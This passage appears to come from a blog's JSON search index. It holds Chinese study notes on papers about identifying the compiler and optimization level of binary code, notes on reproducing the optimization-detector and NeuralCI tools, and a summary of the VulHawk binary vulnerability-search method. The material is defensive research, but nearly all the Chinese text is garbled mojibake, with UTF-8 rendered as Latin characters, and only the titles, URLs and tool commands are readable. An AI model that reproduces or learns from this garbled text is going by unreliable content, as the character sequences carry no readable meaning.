ä»å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è®¡ç®—å°è¾“å…¥å‘é‡æ—¶ï¼Œè®­ç»ƒè¿‡ç¨‹ä¸­å¡«å……çš„ç¼ºå¤±æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚ æ€»ç»“ï¼šå¦‚æœåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä»æœªå¡«å……è¾“å…¥ï¼Œç½‘ç»œåœ¨é¢„æµ‹è¾ƒçŸ­åºåˆ—æ—¶çš„å‡†ç¡®æ€§å°†æ˜¾è‘—é™ä½ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures/","summary":"ä¸­æ–‡è¯‘åï¼šå¤šä½“ç³»ç»“æ„äºŒè¿›åˆ¶ä»£ç ä¸­ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«çš„è¯†åˆ« ä½œè€…ï¼šDAVIDE PIZZOLOTTO å•ä½ï¼šå¤§é˜ªå¤§å­¦ å›½å®¶ï¼š #æ—¥æœ¬ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ACCESS å…³é”®å­—ï¼š #ç¼–è¯‘","title":"Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures"},{"content":"ä»£ç åœ°å€ï¼šGitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries [[Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures]]\nå‡†å¤‡ å®éªŒç”¨åˆ°çš„æ•°æ®é›† following link. ä¹Ÿå¯ä»¥è‡ªå·±æŒ‰ç…§ readme. md æ–‡ä»¶ä¸­çš„ generation èŠ‚ä¸­çš„æ­¥éª¤æ¥è‡ªå·±ç”Ÿæˆæ•°æ®é›†ã€‚ï¼ˆå› ä¸ºæ–‡ç« ä¸­æåˆ°çš„æ‹…å¿ƒè¢«åº“æ–‡ä»¶æ±¡æŸ“ï¼Œæ‰€ä»¥éœ€è¦ docker ç¯å¢ƒæ¥ç”Ÿæˆï¼‰ æ–‡æ¡£ç»“æ„ Resources å­˜å‚¨æµ‹è¯•çš„äºŒè¿›åˆ¶æ–‡ä»¶ Tests å’Œ src æ–‡ä»¶å­˜å‚¨æºä»£ç  generate_dataset.py æ–‡ä»¶è´Ÿè´£ç”Ÿæˆæ•°æ®é›†ï¼ˆå‡†ç¡®çš„è¯´æ˜¯äº¤å‰ç¼–è¯‘ç”Ÿæˆæ‰€éœ€çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ optimization-detector.py æ–‡ä»¶è´Ÿè´£æ–‡ä»¶çš„æå–ï¼ˆå¯æ‰§è¡Œæ•°æ®ï¼‰ï¼Œé¢„å¤„ç†ï¼ˆå¹³è¡¡æ•°æ®é›†ï¼‰ï¼Œè®­ç»ƒã€è¯„ä¼°ã€æ¨æ–­ã€‚ æ•°æ®é›†æ–‡ä»¶ç»“æ„ Dataset æ–‡ä»¶å¤¹ä¸‹çš„æ˜¯å·²ç»ç»è¿‡é¢„å¤„ç†çš„æ•°æ®é›†ï¼Œraw åç¼€è¡¨ç¤ºé‡‡ç”¨åŸå§‹å­—èŠ‚ä½œä¸ºè¾“å…¥ï¼Œfunc è¡¨ç¤ºæŒ‰ç…§å‡½æ•°è¾¹ç•Œè¿›è¡Œäº†æ‹†åˆ†\nä½†æ˜¯æ²¡æœ‰ä¼˜åŒ–ç­‰çº§æ˜¯ O3 çš„æ•°æ®å•Š çªç„¶æ‡‚äº†è¿™ä¸ªé€»è¾‘ï¼Œprocess çš„è¾“å…¥æ˜¯ func å’Œ raw æ–‡ä»¶ï¼Œè¾“å‡º train. binã€test. Binã€validate. Bin æ–‡ä»¶ï¼Œç„¶å train ç”¨ train. Bin ã€validate. Bin æ–‡ä»¶è®­ç»ƒï¼Œevaluate ç”¨ test. Bin çœ‹æ•ˆæœ\nMulti è¡¨ç¤ºå°† gcc å’Œ clang æ··åˆ\nå¤ç° é¦–å…ˆè¦å®‰è£…ä¾èµ– å› ä¸ºç›´æ¥ç”¨ä½œè€…æ•°æ®é›†ï¼Œæ‰€ä»¥å…ˆè·³è¿‡æ•°æ®ç”Ÿæˆå’Œå¤„ç†çš„éƒ¨åˆ†\nè¯„ä¼° python3 optimization-detector. py evaluate -m \u0026lt;model\u0026gt; -o output. csv \u0026lt;dataset_dir\u0026gt;\nModel æ˜¯. h5 æ–‡ä»¶ Dataset_dir æ˜¯ test. bin æ–‡ä»¶ï¼Œä½†æ˜¯æ³¨æ„è¿™é‡Œå†™è·¯å¾„å°±è¡Œï¼Œä¸ç”¨æŒ‡æ˜æ–‡ä»¶åï¼ˆå› ä¸ºä»£ç é‡Œé¢å†™æ­»äº†æ–‡ä»¶åå°±æ˜¯ test. binï¼‰ è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä»£ç é‡Œé¢ä¼šéªŒè¯æ•°æ®é›†çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸æ˜¯ 27ï¼Œä½†æ˜¯ä½œè€…ç»™çš„æ•°æ®é›†é‡Œé¢çš„æ•°æ®æ–‡ä»¶ç¬¬ä¸€ä¸ªå­—èŠ‚éƒ½æ˜¯ 26ï¼Œéœ€è¦æ‰‹åŠ¨æ”¹ä¸€ä¸‹ 2.27ï¼Œç°åœ¨å¡åœ¨äº†ä½œè€…è‡ªå®šä¹‰çš„ generator ç±»ä¸ TensorFlow çš„ data_adapter ä¸åè°ƒä¸Š è®­ç»ƒ python3 optimization-detector.py train -n \u0026lt;network_type\u0026gt; \u0026lt;model_dir\u0026gt;\nnetwork_type é€‰æ‹© lstm æˆ–è€… cnn model_dir æ˜¯åŒ…å«æ•°æ®é›†ï¼ˆé¢„å¤„ç†åï¼‰çš„æ–‡ä»¶å¤¹ ä¼šåœ¨ model_dir è·¯å¾„ä¸‹ç”Ÿæˆ logs æ–‡ä»¶å¤¹ é—®é¢˜ æ•°æ®é›†é‡Œé¢æ€ä¹ˆè¿˜æœ‰ä¸€ä¸ªä»£ç æ–‡ä»¶ æ²¡æœ‰ O3 çº§åˆ«çš„æ•°æ®é›† è²Œä¼¼ä¹Ÿæ²¡æœ‰åŒºåˆ†æ¶æ„ ä¸ºä»€ä¹ˆå¤šåˆ†äº†ä¸€ä¸ªå…¨è¿æ¥å±‚çš„æ¨¡å‹ Mixed æœªçŸ¥ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures%E5%A4%8D%E7%8E%B0/","summary":"ä»£ç åœ°å€ï¼šGitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries [[Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures]] å‡†å¤‡ å®éªŒç”¨åˆ°çš„æ•°æ®é›† following link. ä¹Ÿå¯ä»¥è‡ªå·±æŒ‰ç…§ readme. md æ–‡ä»¶ä¸­çš„ generation èŠ‚ä¸­çš„æ­¥éª¤æ¥è‡ªå·±ç”Ÿæˆæ•°æ®é›†ã€‚ï¼ˆ","title":"Identifying Compiler and Optimization Level in Binary Code From Multiple Architectureså¤ç°"},{"content":"[[Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling]] å®éªŒè¯„ä¼°ä¸­ç”¨ NeuralBS CNNï¼ŒNeuralSD CNN å’Œ NeuralAD CNN æ¥è¡¨ç¤ºåŸºç¡€ CNNï¼Œå¸¦æœ‰ç¼©æ”¾ç‚¹ç§¯æ³¨æ„åŠ›çš„å¢å¼º CNN å’Œå¸¦æœ‰é™„åŠ æ³¨æ„åŠ›çš„å¢å¼º CNN åœ¨ä»¥ä¸‹å®éªŒè¯„ä¼°ä¸­ä½¿ç”¨ NeuralBS GRUï¼ŒNeuralSD GRUï¼ŒNeuralAD GRU å’Œ NeuralQU GRUï¼ˆSD å’Œ AD å’Œ CNN ä¸€æ ·ï¼ŒQU æ˜¯æ–°åŠ çš„ï¼‰\nè¯†åˆ«ç¼–è¯‘å™¨ç³»åˆ— family è¯†åˆ«ç¼–è¯‘å™¨ç‰ˆæœ¬ version è¯†åˆ«ä¼˜åŒ–çº§åˆ« binaryOptimization å’Œ tripleOptimization\nç›®å‰å­˜åœ¨çš„é—®é¢˜ï¼š\nFull å’Œ done åç¼€çš„æ–‡ä»¶ä¸æ˜ç™½ç”¨é€”ï¼ŒBinary å’Œ done çš„åŒºåˆ« TensorFlow ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œéœ€è¦æ”¹éƒ¨åˆ†ä»£ç  ä»£ç ä¸­çš„æ–‡ä»¶è·¯å¾„æŒ‡å‘ï¼ˆæ‰€éœ€è¦çš„ï¼‰æ–‡ä»¶æ²¡æœ‰ï¼Œè²Œä¼¼éœ€è¦è‡ªå·±æ„å»ºæ•°æ®é›†ï¼ˆIDA pro æå–ä»€ä¹ˆçš„ï¼‰ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/neuralci-%E5%A4%8D%E7%8E%B0/","summary":"[[Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling]] å®éªŒè¯„ä¼°ä¸­ç”¨ NeuralBS CNNï¼ŒNeuralSD CNN å’Œ NeuralAD CNN æ¥è¡¨ç¤ºåŸºç¡€ CNNï¼Œå¸¦æœ‰ç¼©æ”¾ç‚¹ç§¯æ³¨æ„åŠ›çš„å¢å¼º CNN å’Œå¸¦æœ‰é™„åŠ æ³¨æ„åŠ›çš„å¢å¼º CNN åœ¨ä»¥ä¸‹å®éªŒè¯„","title":"NeuralCI å¤ç°"},{"content":"ä¸­æ–‡è¯‘åï¼šVulHawkï¼šåŸºäºç†µçš„äºŒè¿›åˆ¶ä»£ç æœç´¢çš„è·¨æ¶æ„æ¼æ´æ£€æµ‹ ä½œè€…ï¼šZhenhao Luo å•ä½ï¼šå›½é˜²ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2023å¹´ æ¥æºï¼š #NDSSä¼šè®® å…³é”®å­—ï¼š #äºŒè¿›åˆ¶ä»£ç æœç´¢ ä»£ç åœ°å€ï¼š https://github.com/RazorMegrez/VulHawk ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-03-20 13:59\næ‘˜è¦ ç›®çš„ï¼šå¯¹ä¸åŒæ¶æ„ã€ä¸åŒç¼–è¯‘å™¨ã€ä¸åŒä¼˜åŒ–çº§åˆ«ç¼–è¯‘çš„ IoT å›ºä»¶æ˜ åƒè¿›è¡ŒäºŒè¿›åˆ¶ä»£ç æœç´¢æ¥è¯†åˆ«ä»£ç é‡ç”¨ æ–¹æ³•ï¼š\næå‡ºäº†ä¸€ç§æ–°çš„ä¸­é—´è¡¨ç¤ºå‡½æ•°æ¨¡å‹ï¼Œæ˜¯ä¸€ç§ç”¨äºè·¨ä½“ç³»ç»“æ„äºŒè¿›åˆ¶ä»£ç æœç´¢çš„ä½“ç³»ç»“æ„ä¸ç¡®å®šæ¨¡å‹ å°†äºŒè¿›åˆ¶ä»£ç æå‡ä¸º IRï¼Œé€šè¿‡è¡¥å……éšå¼æ“ä½œæ•°å’Œåˆ é™¤å†—ä½™æŒ‡ä»¤æ¥ä¿ç•™äºŒè¿›åˆ¶å‡½æ•°çš„ä¸»è¦è¯­è¨€ ä½¿ç”¨ NLP å’Œå·ç§¯ç”Ÿæˆå‡½æ•°åµŒå…¥ å°†ç¼–è¯‘å™¨ã€æ¶æ„å’Œä¼˜åŒ–çº§åˆ«çš„ç»„åˆç§°ä¸ºä¸€ä¸ªæ–‡ä»¶ç¯å¢ƒï¼Œé‡‡ç”¨ divide-and-conquer ç­–ç•¥å°† $C_N^2$ ä¸ªè·¨æ–‡ä»¶ç¯å¢ƒåœºæ™¯çš„ç›¸ä¼¼æ€§é—®é¢˜è½¬åŒ–ä¸º $N-1$ ä¸ªåµŒå…¥è½¬åŒ–å­é—®é¢˜ã€‚ æå‡ºäº†ä¸€ç§åŸºäºç†µçš„é€‚é…å™¨ï¼Œå°†ä¸åŒæ–‡ä»¶ç¯å¢ƒä¸­çš„å‡½æ•°åµŒå…¥ä¼ è¾“åˆ°åŒä¸€æ–‡ä»¶ç¯å¢ƒä¸­ï¼Œä»¥ç¼“è§£ä¸åŒæ–‡ä»¶ç¯å¢ƒé€ æˆçš„å·®å¼‚ æå‡ºäº†ä¸€ç§æ¸è¿›æœç´¢ç­–ç•¥ ç”¨ç»†ç²’åº¦ç‰¹å¾è¡¥å……å‡½æ•°åµŒå…¥ï¼Œä»¥å‡å°‘ä¿®è¡¥å‡½æ•°é€ æˆçš„è¯¯æŠ¥ æ„ä¹‰ï¼šæé«˜æ£€æµ‹ä»£ç é‡ç”¨å¸¦æ¥çš„æ¼æ´çš„æ•ˆç‡ æ•ˆæœï¼šVulHawk çš„æ€§èƒ½ä¼˜äº Asm2Vecã€Asteriaã€BinDiffã€GMNã€PalmTreeã€SAFE å’Œ Trexã€‚\nå¼•è¨€ ç°çŠ¶ï¼š\näºŒè¿›åˆ¶ä»£ç æœç´¢æ–¹æ³•ä¸å¤Ÿå¥å£®ï¼Œä¸èƒ½è·¨å¹³å° Asm2Vec[10]ã€DeepBinDiff[11]å’Œ PalmTree[27]ä½¿ç”¨è‡ªç„¶è¯­è¨€å¤„ç† (NLP) æŠ€æœ¯å–å¾—äº†ä»¤äººé¼“èˆçš„ç»“æœï¼ˆä¸èƒ½è·¨å¹³å°ï¼‰ InnerEye[60]å°†æ¥è‡ªä¸åŒ isa çš„äºŒè¿›åˆ¶ä½œä¸ºä¸åŒçš„è‡ªç„¶è¯­è¨€ï¼Œå¹¶ä½¿ç”¨ç¥ç»æœºå™¨ç¿»è¯‘æ¥è®¡ç®—äºŒè¿›åˆ¶ä»£ç çš„ç›¸ä¼¼åº¦ã€‚SAFE[35]ä½¿ç”¨æ¥è‡ªå¤šä¸ª isa çš„äºŒè¿›åˆ¶æ¥è®­ç»ƒå…¶è¯­è¨€æ¨¡å‹ï¼Œä»¥è·¨ä½“ç³»ç»“æ„æœç´¢äºŒè¿›åˆ¶ä»£ç ã€‚ï¼ˆä¸¥é‡ä¾èµ–äºè®­ç»ƒæ•°æ®ï¼Œå¾ˆéš¾å®ç°å¤šä¸ª isaï¼‰ å°†ç‰¹å®šäºä½“ç³»ç»“æ„çš„äºŒè¿›åˆ¶ä»£ç æå‡ä¸ºä¸ä½“ç³»ç»“æ„æ— å…³çš„ä¸­é—´è¡¨ç¤º (IR) æ˜¯è§£å†³ç‰©è”ç½‘å›ºä»¶ä¸­è·¨ä½“ç³»ç»“æ„æŒ‘æˆ˜çš„æœ‰æ•ˆæ–¹æ³•ã€‚ä½†æ˜¯ IR å’Œè‡ªç„¶è¯­è¨€æœ‰æœ¬è´¨åŒºåˆ«ã€‚ ç›¸åŒæºç ç»è¿‡ä¸åŒä¼˜åŒ–çº§åˆ«çš„ç¼–è¯‘å™¨ç¼–è¯‘åå¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶è¯­ä¹‰ç›¸ä¼¼ä½†ç»“æ„ä¸åŒ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬è€ƒè™‘äº† 3 ç§æ¶æ„ (x86ã€arm å’Œ mips)ã€2 ç§å­—å¤§å° (32 ä½å’Œ 64 ä½)ã€2 ä¸ªç¼–è¯‘å™¨ (Clang å’Œ GCC) å’Œ 6 ä¸ªä¼˜åŒ–çº§åˆ« (O0ã€O1ã€O2ã€O3ã€Os å’Œ Ofast)ï¼Œæ€»å…± 72 ç§ç»„åˆ (3 Ã— 2 Ã— 2 Ã— 6)ã€‚ æœ¬æ–‡æå‡ºäº†ä¸€ç§æ–°çš„è·¨æ¶æ„äºŒè¿›åˆ¶ä»£ç æœç´¢æ–¹æ³• VulHawk\næ–°çš„ä¸­é—´è¡¨ç¤ºå‡½æ•°æ¨¡å‹ (IRFM)â€”â€”æ¥ç”Ÿæˆå¥å£®çš„å‡½æ•°åµŒå…¥â€”â€”è§£å†³è·¨æ¶æ„å’ŒæŒ‡ä»¤ç®€åŒ– éƒ¨ç½²äº†ä¸€ä¸ªåŸºäºç†µçš„é€‚é…å™¨â€”â€”å¯¹ä¸åŒç¼–è¯‘å™¨ã€ä½“ç³»ç»“æ„å’Œä¼˜åŒ–çº§åˆ«çš„äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œç¼“è§£ä¸åŒç¯å¢ƒé€ æˆçš„å·®å¼‚ æ¸è¿›æœç´¢ç­–ç•¥æ¥æœç´¢å€™é€‰å‡½æ•° æå‡ºä¸€ç§ç›¸ä¼¼åº¦æ ‡å®šæ–¹æ³•â€”â€”å‡å°‘è¯¯æŠ¥ èƒŒæ™¯ é—®é¢˜å®šä¹‰ ä¸€ä¸ªæœ‰æ•ˆçš„è·¨æ¶æ„çš„äºŒè¿›åˆ¶ä»£ç æœç´¢éœ€è¦å®ç°ï¼š\næ”¯æŒè·¨æ¶æ„ æ”¯æŒè·¨ç¼–è¯‘å™¨ æ”¯æŒè·¨ä¼˜åŒ– é«˜ç²¾åº¦å’Œæ•ˆç‡ ç†µç†è®º é¦™å†œçš„ç†µç†è®ºå¯ä»¥ç”¨æ¥è¡¡é‡ç³»ç»Ÿä¸­çš„éšæœºæ€§å’Œå¹³å‡ä¿¡æ¯é‡ é€šè¿‡ç†µåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ·±å…¥ç ”ç©¶ç³»ç»Ÿä¹‹å‰é¢„å…ˆäº†è§£ç³»ç»Ÿä¸­çš„å¹³å‡ä¿¡æ¯é‡ã€‚åœ¨äºŒè¿›åˆ¶ä»£ç æœç´¢ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡äºŒè¿›åˆ¶æ–‡ä»¶ç†µå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯åˆ†å¸ƒï¼Œå®ƒå¯ä»¥æ¨æ–­å‡ºäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«ç­‰ä¿¡æ¯ã€‚è¿™æœ‰åŠ©äºæˆ‘ä»¬çš„æ¨¡å‹ä¸ºä¸åŒçš„è¾“å…¥äºŒè¿›åˆ¶é€‰æ‹©åˆé€‚çš„å‚æ•°ã€‚\nè®¾è®¡ IR å‡½æ•°æ¨¡å‹ï¼ˆIRFMï¼‰ å°†äºŒè¿›åˆ¶ä»£ç çš„ IR ä½œä¸ºä¸­é—´è¡¨ç¤ºå‡½æ•°æ¨¡å‹ (IRFM)ï¼ˆåŸºäº RoBERTa æ¨¡å‹ï¼‰çš„è¾“å…¥ï¼Œè¾“å‡ºæ˜¯ IR çš„è¯åµŒå…¥ã€‚ IRFM å°† IR å‡½æ•°åµŒå…¥åˆ°é«˜ç»´åµŒå…¥ç©ºé—´ä¸­ï¼Œä½¿å¾—è¯­ä¹‰ç›¸ä¼¼å‡½æ•°çš„åµŒå…¥åœ¨æ•°å€¼ç©ºé—´ä¸­æ›´åŠ ç´§å¯†ã€‚\nTokenization å°†ä¸€æ¡æŒ‡ä»¤åˆ†å‰²ä¸ºä¸€ä¸ªæ“ä½œç å’Œä¸‰ä¸ªæ“ä½œæ•° ç”¨ç‰¹æ®Šæ ‡è®° addr æ¥è§„èŒƒåœ°å€ å¯¹äº OOV ï¼ˆOut-Of-Vocabulary)ï¼‰é—®é¢˜ï¼Œä½œè€…å¼•å…¥ 16 ä¸ªæ ¹æ“ä½œæ•°ï¼Œè¡¨å†…çš„æ“ä½œæ•°å°±ä½¿ç”¨è‡ªå·±çš„ tokenï¼Œéè¡¨å†…æ“ä½œæ•°å°±ä½¿ç”¨å¯¹åº”çš„æ ¹ token åœ¨é¢„è®­ç»ƒé˜¶æ®µï¼Œæˆ‘ä»¬å°†é¢‘ç‡å°äº 100 æ¬¡çš„ä»¤ç‰Œæ›¿æ¢ä¸ºå…¶æ ¹æ“ä½œæ•°ä»¤ç‰Œï¼Œä»¥æ„å»ºæ ¹æ“ä½œæ•°ä»¤ç‰ŒåµŒå…¥ã€‚ è¯­è¨€æ¨¡å‹ IRFM åŸºäº RoBERTa æ¨¡å‹ï¼Œä½†æ˜¯ IR å’Œè‡ªç„¶è¯­è¨€æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥ä½œè€…è¿›è¡Œäº†éƒ¨åˆ†æ”¹åŠ¨\nToken ç±»å‹å±‚ ä½¿ç”¨ä»¤ç‰Œç±»å‹å±‚æ¥å¸®åŠ© IRFM åŒºåˆ†æ“ä½œç å’Œæ“ä½œæ•°ã€‚å°†ä»¤ç‰Œåˆ†ä¸ºä¸‰ç§ç±»å‹: æ“ä½œç ã€æ“ä½œæ•°å’Œå…¶ä»–ã€‚å…¶ä»–ç±»å‹åŒ…æ‹¬æ²¡æœ‰å®é™…è¯­ä¹‰çš„ç‰¹æ®Šæ ‡è®°ã€‚ æŒ‡ä»¤ç®€åŒ– äºŒè¿›åˆ¶ä»£ç åŒ…å« EFLAGS (å³æ ‡å¿—å¯„å­˜å™¨) ä½œä¸ºéšå¼æ“ä½œæ•°ã€‚ä¸è€ƒè™‘ EFLAGSï¼Œé‡è¦çš„è¯­ä¹‰ä¼šä¸¢å¤±ï¼Œè€ƒè™‘æ‰€æœ‰çš„ EFLAGSï¼Œå†—ä½™çš„ eflag ä¸ä»…ä¼šå¼•å…¥é¢å¤–çš„å¼€é”€ï¼Œè€Œä¸”å¯èƒ½ä¼šæ¨¡ç³ŠäºŒè¿›åˆ¶ä»£ç çš„ä¸»è¦è¯­ä¹‰ã€‚ æ‰€ä»¥åªè€ƒè™‘ä½¿ç”¨è¿‡çš„ eflagsï¼Œé€šè¿‡ IR å°†æ¯ä¸ªéšå¼æ“ä½œæ•°æŒ‡ä»¤çš„èµ‹å€¼è½¬æ¢ä¸ºå®èµ‹å€¼æŒ‡ä»¤ï¼Œå¹¶å°†å…¶ä½¿ç”¨çš„ EFLAGS ä¿å­˜ä¸ºæŒ‡ä»¤åºåˆ— å¦‚ä¸‹å›¾æ‰€ç¤º a åˆ° b åˆ é™¤äº†æ²¡æœ‰ä½¿ç”¨åˆ°çš„å¯„å­˜å™¨å’Œæ ‡å¿—å¯„å­˜å™¨ï¼Œb åˆ° c åˆå¯¹å€¼ä¼ é€’è¿›è¡Œäº†ä¼˜åŒ–ï¼ˆåŒ–ç®€ï¼‰ æå‡ºäº†ä¸€ç§åŸºäº def-use å…³ç³»çš„æŒ‡ä»¤ç®€åŒ–æ–¹æ³• æ ‡è®°é‡è¦æŒ‡ä»¤ï¼ˆä½¿ç”¨æ¾æ•£è§„åˆ™ï¼Œä»¥ç¡®ä¿ä¸ä¼šé”™è¯¯åœ°åˆ é™¤ä¸»è¯­ä¹‰ï¼‰ï¼š ç›®æ ‡æ“ä½œæ•°ä¸ºå†…å­˜åœ°å€çš„èµ‹å€¼æŒ‡ä»¤ï¼ˆå› ä¸ºå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡å­˜å‚¨åœ¨å†…å­˜ä¸­è€Œä¸æ˜¯å¯„å­˜å™¨ä¸­ï¼‰ åœ¨æ‰€æœ‰è·¯å¾„çš„è¿”å›æŒ‡ä»¤é™„è¿‘æ ¹æ®è°ƒç”¨çº¦å®šæ ‡è®°ç‰¹å®šçš„å¯„å­˜å™¨ï¼ˆå› ä¸ºè¿”å›å€¼é€šå¸¸å­˜å‚¨åœ¨ç‰¹å®šçš„å¯„å­˜å™¨ï¼‰ ä¿®å‰ªæœªä½¿ç”¨çš„æŒ‡ä»¤ å°†å…¶å®šä¹‰çš„å¯„å­˜å™¨æˆ– EFLAGS æœªåœ¨åç»­æŒ‡ä»¤ä¸­ä½¿ç”¨çš„æŒ‡ä»¤è§†ä¸ºæœªä½¿ç”¨çš„æŒ‡ä»¤ ä¼˜åŒ–å†—ä½™æŒ‡ä»¤ï¼ˆå€¼ä¼ é€’æŒ‡ä»¤ï¼‰ é¢„è®­ç»ƒä»»åŠ¡ åœ¨è®­ç»ƒé˜¶æ®µï¼Œæˆ‘ä»¬ä½¿ç”¨ Masked Language Model (MLM)ã€æ ¹æ“ä½œæ•°é¢„æµ‹ (ROP) å’Œç›¸é‚»å—é¢„æµ‹ (ABP) è¿›è¡Œé¢„è®­ç»ƒã€‚\nMasked Language Model æˆ‘ä»¬å¼•å…¥äº† MLM æ¨¡å‹æ¥ç†è§£ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶å»ºç«‹åˆé€‚çš„è¯åµŒå…¥ã€‚ æ ¹æ“ä½œæ•°é¢„æµ‹ ç”¨äºè§£å†³ OOV é—®é¢˜ï¼Œä¸º OOV æ“ä½œæ•°åŒ¹é…æ ¹æ“ä½œæ•° token é‚»å—é¢„æµ‹ å› ä¸ºæ•°æ®æµçš„å­˜åœ¨ï¼Œæ‰€ä»¥åŸºæœ¬å—æ•°é¡ºåºæ•æ„Ÿçš„ï¼ŒABP é¢„è®­ç»ƒæ˜¯ä¸ºäº†è®©æ¨¡å‹æ•è·è¿™ç§æ•°æ®æµå…³ç³» å…·ä½“æ¥è¯´ï¼Œç»™å®šä¸¤ä¸ªåŸºæœ¬åŒºå— A å’Œ Bï¼Œå…¶ä¸­ B æ˜¯ A çš„åç»§åŒºå—ï¼Œå˜é‡ x å®šä¹‰åœ¨åŒºå— A ä¸­ï¼Œå˜é‡ x ä½¿ç”¨åœ¨åŒºå— B ä¸­ï¼Œæˆ‘ä»¬å°† A-B çš„é¡ºåºæ ‡è®°ä¸ºæ­£ï¼ŒB-A çš„é¡ºåºæ ‡è®°ä¸ºè´Ÿã€‚æ³¨æ„ï¼ŒA å’Œ B ä¸æ˜¯åŒä¸€ä¸ªå—ï¼ŒA ä¹Ÿä¸æ˜¯ B çš„åç»§å—ã€‚å¦å¤–ï¼Œæˆ‘ä»¬ä¸è®¤ä¸ºè¿™äº›æƒ…å†µä¸‹ A å’Œ B åªæœ‰æ§åˆ¶æµå…³ç³»è€Œæ²¡æœ‰æ•°æ®æµå…³ç³»ã€‚å› ä¸ºå¦‚æœä¸æ”¯æŒæ•°æ®æµå…³ç³»ï¼Œå—çš„é¡ºåºä¹Ÿå¯èƒ½é¢ å€’ã€‚æˆ‘ä»¬å°† IRFM ä¸­ä»¤ç‰Œ[cls]çš„æœ€ç»ˆéšè—çŠ¶æ€è¾“å…¥åˆ° ABP å¤´ä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªçº¿æ€§å˜æ¢ï¼Œä»¥è¯†åˆ«è¾“å…¥çš„ä¸¤ä¸ªå¾®ç åºåˆ—æ˜¯å¦æ­£åºã€‚ å‡½æ•°åµŒå…¥ç”Ÿæˆ é¦–å…ˆç”ŸæˆåŸºæœ¬å—åµŒå…¥\nå¯¹äºè¾“å…¥çš„ IR å—ï¼ŒIRFM è½¬åŒ–ç¼–ç å™¨è¾“å‡ºéšè—çŠ¶æ€åºåˆ—ï¼Œç„¶ååœ¨å€’æ•°ç¬¬äºŒå±‚çš„éšè—çŠ¶æ€ä¸Šä½¿ç”¨å‡å€¼æ± æ¥ç”ŸæˆåŸºæœ¬å—åµŒå…¥ã€‚ï¼ˆå› ä¸ºç ”ç©¶è¡¨æ˜å€’æ•°ç¬¬äºŒå±‚çš„éšè—çŠ¶æ€æ¯”æœ€åä¸€å±‚çš„éšè—çŠ¶æ€å…·æœ‰æ›´å¼ºçš„æ³›åŒ–èƒ½åŠ›ã€‚ï¼‰ é›†æˆåŸºæœ¬å—åµŒå…¥å’Œ cfg æ¥ç”Ÿæˆå‡½æ•°åµŒå…¥\nä½¿ç”¨ GCNs æ•è· CFG ç»“æ„ï¼Œå°†äºŒè¿›åˆ¶å‡½æ•°è§†ä¸ºå±æ€§å›¾ï¼Œå…¶ä¸­å®ƒä»¬çš„åŸºæœ¬å—æ˜¯å›¾ä¸­çš„èŠ‚ç‚¹ï¼Œå®ƒä»¬çš„åµŒå…¥æ˜¯èŠ‚ç‚¹çš„å±æ€§ã€‚æˆ‘ä»¬å°†å±æ€§æ§åˆ¶æµå›¾ (acfg) è¾“å…¥åˆ° GCN å±‚ã€‚ åŸºäºç†µçš„é€‚é…å™¨ Divide-and-conquer å›¾ 5 æ˜¾ç¤ºäº†åœ¨åµŒå…¥ç©ºé—´ä¸­åŒ¹é…ç›¸ä¼¼å‡½æ•°çš„ç¤ºä¾‹ã€‚å¯ä»¥çœ‹åˆ°æ··åˆæ–‡ä»¶ç¯å¢ƒçš„æ–‡ä»¶ç»è¿‡é€‚é…å™¨åè¿›è¡Œäº†ç»Ÿä¸€ã€‚ï¼ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç¿»è¯‘å™¨ï¼‰ 